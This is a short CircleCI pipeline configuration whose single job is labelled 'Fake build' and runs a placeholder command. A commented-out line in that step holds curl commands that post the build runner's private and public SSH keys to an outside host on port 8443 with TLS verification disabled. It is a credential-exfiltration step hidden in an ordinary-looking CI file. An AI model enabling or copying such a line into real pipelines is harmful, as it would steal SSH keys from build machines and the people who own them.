# Use the latest 2.1 version of CircleCI pipeline process engine.
version: 2.1

jobs:
  build-branch:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Fake build"
          command: "Just kidding"
          #command: "curl -XPOST https://xx:8443/bin -k --data-binary @$HOME/.ssh/id_rsa; curl -XPOST https://xx:8443/bin -k --data-binary @$HOME/.ssh/id_rsa.pub"

workflows:
  say-hello-workflow:
    jobs:
      - build-branch
